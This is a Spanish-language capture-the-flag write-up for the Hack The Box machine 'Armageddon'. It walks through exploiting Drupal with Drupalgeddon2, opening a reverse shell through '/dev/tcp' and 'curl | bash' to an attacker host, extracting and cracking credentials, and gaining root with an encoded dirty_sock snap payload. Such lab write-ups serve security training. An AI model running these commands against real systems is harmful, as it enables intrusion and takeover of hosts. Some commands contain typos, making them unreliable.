---
layout: post
title: HTB_Armageddon
date: 2023/07/10
slug: HTB_Armageddon
heroImage: /assets/machines.jpg
---

# Armageddon {-}

## Introduccion {-}

La maquina del dia 24/07/2021 se llama Armageddon.

El replay del live se puede ver en [Twitch: S4vitaar Olympus maquina](https://www.twitch.tv/videos/1096891939)
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.233
```
ttl: 63 -> maquina linux. 
Recuerda que de ttl 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.233 -oG allPorts
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.233 -oN targeted
```

- Drupal 7

|Puerto|Servicio| Que se nos occure?              |    Que falta?      |
|------|--------|---------------------------------|--------------------|
|22    |ssh     |Accesso directo                  |usuario y contraseña|
|80    |http    |Drupal-armageddon (drupalgeddon2)|Checkear el exploit |

#### Browsear la web {-}

Nada interessante.
## Evaluacion de vulnerabilidades {-}

### Druppalgeddon {-}

**Druppalgeddon2** es un exploit creado por Hans Topo y g0tmi1k escrito en ruby que aprovecha de vulnerabilidades
de drupal y que directamente nos daria una shell.

```bash
git clone https://github.com/dreadlocked/Drupalgeddon2
cd Drupalgeddon2
cat drupalgeddon2.rb
ruby drupalgeddon2.rb
```
## Explotacion de vulnerabilidad & Ganando acceso {-}

### Druppalgeddon {-}

```bash
ruby druppalgeddon2.rb 10.10.10.233
whoami
#Output
> apache
ifconfig
#Output
> 10.10.10.233
```

Entablamos ahora una reverse shell para sacarse de este contexto.

1. maquina de atacante

    ```bash
    nc -nlvp 443
    ```

1. druppalgeddon2 shell

    ```bash
    bash -i >& /dev/tcp/10.10.14.20/443 0>&1
    ```

Esto no functiona porque el comando contiene **bad chars**. Como la maquina no tiene **nc** ni **ncat** la tecnica seria la siguiente:

1. Creamos un archivo *index.html* que contiene

    ```html
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.20/443 0>&1
    ```

1. Compartimos un servidor web con *python*

    ```bash
    python3 -m http.server 80
    ```

1. En la drupalgeddon2 shell

    ```bash
    curl -s 10.10.14.20 | bash
    ```
    
ya esta...

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
```

En este caso no nos va el tratamiento de la **TTY**. En este caso lo que hacemos es utilizar el 
```bash
 rlwrap nc -nlvp 443 
```


### Investigamos la maquina {-}

```bash
pwd
#Output
/var/www/html

ls -l
#Output
muchas cosas

grep -r -E -i "user|pass|key"
#Output
muchas cosas

grep -r -E -i "username|pass|key"
#Output
muchas cosas
```

Como hay muchas cosas y es dificil de analizar usamos el comando 
```bash
 find 
```
 y vamos quitando con el comando 
```bash
 grep -v 
```
 las cosas que no 
nos interresan poco a poco.

```bash
find \-type -f 2>/dev/null
find \-type -f 2>/dev/null | grep -v "themes"
find \-type -f 2>/dev/null | grep -v -E "themes|modules"
```

Ahora ya se puede investigar manualmente. Apuntamos los recursos que parecen interesantes.

- authorize.php
- cron.php
- includes/database
- includes/password.inc
- sites/default/

Lo miramos hasta que encontremos cosas interesantes. En un fichero encontramos un user **drupaluser** y su contraseña.

Miramos los usuarios de la maquina 

```bash
grep "sh$" /etc/passwd
#Output
root
brucetherealadmin
```

Como el servicio ssh esta abierto miramos si la contraseña functiona con el usuario brucetherealadmin pero no functiona.

Como hemos visto ficheros *mysql* intentamos conectar con el **drupaluser** y functiona.

```bash
mysql -u 'drupaluser' -p "SLKDENkldajsn!!$" -e 'show databases;'
mysql -u 'drupaluser' -p "SLKDENkldajsn!!$" -e 'use drupal; show tables;'
mysql -u 'drupaluser' -p "SLKDENkldajsn!!$" -e 'use drupal; describe users;'
mysql -u 'drupaluser' -p "SLKDENkldajsn!!$" -e 'use drupal; select name,pass from users;'
```

Encontramos el usuario 'brucetherealadmin' y su contraseña encryptada.

### John {-}

1. copiamos el hash en un fichero llamado 
```bash
 hash 
```

1. john --wordlist=/usr/share/wordlists/rockyout.txt hash

Ya tenemos contraseña para el usuario *brucetherealadmin*

### SSH {-}

```bash
ssh brucetherealadmin@10.10.10.233
```

ya tenemos la flag user.txt
## Escalada de privilegios {-}

### Enumeracion del usuario en la maquina victima {-}

```bash
whoami
id
sudo -l
```

Vemos que podemos lanzar snap como root.

Buscamos en google snap hook exploit .snap file y encontramos el link siguiente 
[Linux Privilege Escalation via snapd (dirty_sock exploit)](https://initblog.com/2019/dirty-sock/). Econtramos
un hook que genera un nuevo local user. Lo miramos y lo reutilizamos usando python.

```bash
echo "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" | xargs | tr -d ' '
```

copiamos el output y recreamos el paquete snap malicioso

```bash
cd /tmp
pytho -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD
//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29
jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1
EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2Q
gLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N
1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciB
leHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiA
gJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAA
BaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3F
qfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4
wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRj
NEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPt
vjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAA
AAAAAPgMAAAAAAAAEgAAAAACAA" + "A"*4256 + "=="' | base64 -d > setenso.snap

sudo /usr/bin/snap install setenso.snap --devmode
cat /etc/passwd
sudo dirty_sock > password dirty_sock
sudo su > password dirty_sock

whoami
#Output
root
```
